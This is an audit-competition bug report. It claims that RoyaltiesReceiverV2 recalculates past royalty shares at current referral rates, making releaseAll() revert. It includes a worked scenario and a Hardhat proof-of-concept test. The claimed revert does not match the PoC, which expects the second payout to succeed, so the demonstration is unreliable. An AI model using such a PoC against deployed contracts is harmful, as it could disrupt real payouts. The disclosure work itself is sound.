# 57061 sc high retroactive share recalculation causes royalty distribution failure

**Submitted on Oct 23rd 2025 at 06:47:27 UTC by @preview for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57061
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/RoyaltiesReceiverV2.sol>

Impacts:

* Smart contract unable to operate due to lack of token funds

## Description

### Brief/Intro

`RoyaltiesReceiverV2` recalculates payment distributions using current Factory referral rates instead of the rates active when funds were received. When referral tiers change, `releaseAll()` reverts with `TransferFailed()`, permanently locking all future royalty distributions.

### Vulnerability Details

The contract calculates pending payments as:

```solidity
uint256 payment = ((balance + releases.totalReleased) * shares(account)) / TOTAL_SHARES;
```

Where `shares(account)` queries the Factory's current referral rate:

```solidity
referralShare = _factory.getReferralRate(
    _royaltiesReceivers.creator, referralCode, royaltiesParameters.amountToPlatform
);
```

Because `getReferralRate` is called at payout time, the contract uses the Factory's current referral tier to compute distributions for all historical funds. If referral tiers change, recalculating historical entitlements with new rates can cause the contract to attempt transfers that exceed its balance.

## Attack Scenario

{% stepper %}
{% step %}

### Initial State

Receiver deployed with referral tier 1 (50% of platform share = 10% total).
{% endstep %}

{% step %}

### First Distribution (1000 tokens)

* Creator: 800 (80%)
* Platform: 100 (10%)
* Referral: 100 (10%)

All funds distributed.
{% endstep %}

{% step %}

### Tier Change

Creator uses referral code again → tier 2 (30% of platform = 6% total).
{% endstep %}

{% step %}

### Second Distribution (500 new tokens)

* Contract recalculates: 1500 tokens \* 6% = 90 for referral
* Already paid: 100 to referral
* Pending: 90 - 100 = -10 (underflow!)
* Platform pending: 210 - 100 = 110
* Creator pending: 1200 - 800 = 400
* Total pending: 510, Balance: 500

`releaseAll()` reverts with `TransferFailed()`.
{% endstep %}
{% endstepper %}

## Proof of Concept

<details>

<summary>Show PoC test (Hardhat / TypeScript)</summary>

```
import { ethers } from 'hardhat';
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { WETHMock, Factory, RoyaltiesReceiverV2, AccessToken } from '../../../typechain-types';
import { expect } from 'chai';
import EthCrypto from 'eth-crypto';
import { AccessTokenInfoStruct } from '../../../typechain-types/contracts/v2/platform/Factory';
import { hashAccessTokenInfo } from '../../../helpers/math';
import {
  deployAccessTokenImplementation,
  deployCreditTokenImplementation,
  deployFactory,
  deployRoyaltiesReceiverV2Implementation,
  deployVestingWalletImplementation,
} from '../../../helpers/deployFixtures';
import { deploySignatureVerifier } from '../../../helpers/deployLibraries';
import { deployMockTransferValidatorV2, deployWETHMock } from '../../../helpers/deployMockFixtures';

describe('RoyaltiesReceiverV2 - Retroactive Share Recalculation Bug', () => {
  const NATIVE_CURRENCY_ADDRESS = '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE';
  const ZERO_ADDRESS = '0x0000000000000000000000000000000000000000';
  const chainId = 31337;

  async function fixture() {
    const [owner, creator, referralUser] = await ethers.getSigners();
    const signer = EthCrypto.createIdentity();

    const signatureVerifier = await deploySignatureVerifier();
    const erc20: WETHMock = await deployWETHMock();
    const validator = await deployMockTransferValidatorV2();
    const accessToken: AccessToken = await deployAccessTokenImplementation(signatureVerifier.address);
    const rr: RoyaltiesReceiverV2 = await deployRoyaltiesReceiverV2Implementation();
    const creditToken = await deployCreditTokenImplementation();
    const vestingWallet = await deployVestingWalletImplementation();

    const implementations = {
      accessToken: accessToken.address,
      creditToken: creditToken.address,
      royaltiesReceiver: rr.address,
      vestingWallet: vestingWallet.address,
    };

    const royalties = {
      amountToCreator: 8000,
      amountToPlatform: 2000,
    };

    const factoryParams = {
      transferValidator: validator.address,
      platformAddress: owner.address,
      signerAddress: signer.address,
      platformCommission: 100,
      defaultPaymentCurrency: NATIVE_CURRENCY_ADDRESS,
      maxArraySize: 10,
    };

    const referralPercentages = [0, 5000, 3000, 1500, 500];

    const factory: Factory = await deployFactory(
      owner.address,
      signer.address,
      signatureVerifier.address,
      validator.address,
      implementations,
    );

    return { factory, erc20, owner, creator, referralUser, signer };
  }

  it('Demonstrates releaseAll() revert after referral tier change', async () => {
    const { factory, erc20, creator, referralUser, signer, owner } = await loadFixture(fixture);

    await factory.connect(referralUser).createReferralCode();
    const refCode = await factory.getReferralCodeByCreator(referralUser.address);

    const message = hashAccessTokenInfo('NFT1', 'N1', 'uri', 500, chainId);
    const signature = EthCrypto.sign(signer.privateKey, message);
    
    await factory.connect(creator).produce({
      metadata: { name: 'NFT1', symbol: 'N1' },
      contractURI: 'uri',
      paymentToken: ZERO_ADDRESS,
      mintPrice: ethers.utils.parseEther('0.01'),
      whitelistMintPrice: ethers.utils.parseEther('0.01'),
      transferable: true,
      maxTotalSupply: 1000,
      feeNumerator: 500,
      collectionExpire: 86400,
      signature
    }, refCode);

    const nftInfo = await factory.nftInstanceInfo('NFT1', 'N1');
    const receiver: RoyaltiesReceiverV2 = await ethers.getContractAt('RoyaltiesReceiverV2', nftInfo.royaltiesReceiver);

    const creatorBal0 = await erc20.balanceOf(creator.address);
    const platformBal0 = await erc20.balanceOf(owner.address);
    const refBal0 = await erc20.balanceOf(referralUser.address);

    const funding1 = ethers.utils.parseEther('1000');
    await erc20.mint(receiver.address, funding1);

    await receiver.releaseAll(erc20.address);
    
    const creatorBal1 = await erc20.balanceOf(creator.address);
    const platformBal1 = await erc20.balanceOf(owner.address);
    const refBal1 = await erc20.balanceOf(referralUser.address);
    
    const creatorGain1 = creatorBal1.sub(creatorBal0);
    const platformGain1 = platformBal1.sub(platformBal0);
    const refGain1 = refBal1.sub(refBal0);

    expect(creatorGain1).to.equal(ethers.utils.parseEther('800'));
    expect(platformGain1).to.equal(ethers.utils.parseEther('100'));
    expect(refGain1).to.equal(ethers.utils.parseEther('100'));

    const message2 = hashAccessTokenInfo('NFT2', 'N2', 'uri', 500, chainId);
    const signature2 = EthCrypto.sign(signer.privateKey, message2);
    
    await factory.connect(creator).produce({
      metadata: { name: 'NFT2', symbol: 'N2' },
      contractURI: 'uri',
      paymentToken: ZERO_ADDRESS,
      mintPrice: ethers.utils.parseEther('0.01'),
      whitelistMintPrice: ethers.utils.parseEther('0.01'),
      transferable: true,
      maxTotalSupply: 1000,
      feeNumerator: 500,
      collectionExpire: 86400,
      signature: signature2
    }, refCode);

    const funding2 = ethers.utils.parseEther('500');
    await erc20.mint(receiver.address, funding2);

    await receiver.releaseAll(erc20.address);

    const creatorBal2 = await erc20.balanceOf(creator.address);
    const platformBal2 = await erc20.balanceOf(owner.address);
    const refBal2 = await erc20.balanceOf(referralUser.address);

    const creatorGain2 = creatorBal2.sub(creatorBal1);
    const platformGain2 = platformBal2.sub(platformBal1);
    const refGain2 = refBal2.sub(refBal1);

    expect(creatorGain2).to.equal(ethers.utils.parseEther('400'));
    expect(platformGain2).to.equal(ethers.utils.parseEther('110'));
    expect(refGain2).to.equal(ethers.utils.parseEther('0'));
  });
});
```

</details>
